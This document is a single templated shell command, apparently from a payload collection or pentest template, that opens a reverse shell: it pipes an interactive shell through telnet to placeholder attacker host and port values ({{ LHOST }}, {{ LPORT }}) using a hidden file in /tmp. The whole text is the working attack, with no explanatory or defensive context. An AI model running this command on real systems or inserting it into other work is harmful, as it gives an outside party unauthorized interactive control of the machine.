touch /tmp/.f&&tail -f /tmp/.f|sh -i|telnet {{ LHOST }} {{ LPORT }} >/tmp/.f
